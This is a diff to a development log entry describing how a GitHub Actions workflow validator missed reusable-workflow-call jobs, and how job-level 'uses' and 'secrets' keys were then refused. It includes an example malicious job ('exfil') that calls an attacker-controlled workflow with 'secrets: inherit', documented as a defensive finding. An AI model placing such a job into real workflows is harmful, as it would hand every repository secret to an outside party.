@@ -1843,3 +1843,41 @@ guidance unless AGENTS.md says otherwise. Append-only; entries must pass the
      (`env:` is already checked at), reusing the SAME violated name since
      it's structurally the identical scan on a sibling map, not a new
      invariant.
+
+- **Fix-loop iteration 2 (2026-08-23, `plan-verifier` re-check of iteration
+  1's own fixes) — a per-JOB check that only ever descends into `job.steps`
+  has an entire second surface it never looked at: the job object itself.**
+  `workflow-validate.ts`'s per-job loop `continue`s immediately when
+  `job.steps` isn't an array (`if (!Array.isArray(steps)) continue;`) — a
+  GitHub Actions **reusable-workflow-call job**
+  (`jobs.exfil: { uses: 'attacker/repo/.github/workflows/x.yml@<sha>',
+  secrets: inherit }`) has no `steps` at all, so it hits that `continue` and
+  skips EVERY step-level check, including the `uses:` identity allowlist —
+  which, despite living in the same function, only ever ran INSIDE the step
+  loop and so never once looked at `job.uses` itself. `secrets: inherit` on
+  such a job hands the called (attacker-controlled) workflow every
+  repository secret. The review job stays intact in this attack, so
+  `reviewStepFound`/`forkGuardFound` are both satisfied by it and the
+  malicious sibling job validates `ok: true` right alongside it — this
+  passed BOTH of iteration 1's own new unit tests (identity allowlist,
+  `with:` secret scan) because neither test added a second job; every test
+  in the file up to that point mutated the existing single `review` job.
+  **Fix:** two unconditional refusals added right after the existing
+  `'permissions' in job` guard (same position, same "no allowlist, just
+  refuse — this module's generator never emits this key at the job level"
+  shape): `'uses' in job` → `action_not_allowlisted` (reuses the step-level
+  check's name — same invariant, a channel it didn't cover), `'secrets' in
+  job` → `foreign_secret_reference` (reuses the existing name for the same
+  reason). **General lesson for this file's shape specifically:** every
+  future per-job invariant needs to ask "does this apply to the JOB object
+  itself, or only to jobs that happen to have `steps`?" — a reusable-
+  workflow-call job is a legitimate, spec-compliant GitHub Actions job
+  shape that satisfies `isPlainObject(job)` and nothing else this validator
+  assumes about "a job" (namely, that it has `steps`). Also resolved
+  alongside (verifier's own Minor/Nit, not the Major): dropped a dead
+  `mapHasForeignSecretRef(doc.with, ...)` scan at workflow level — `with:`
+  isn't a valid workflow-level Actions key at all — and renamed
+  `containsGithubEnvWrite` → `mentionsGithubEnv` (the `github_env_write`
+  violated NAME is unchanged; only the predicate's name, which mismatched
+  what it actually checks — any mention of the token, not just a
+  `>>`-shaped write — was renamed).
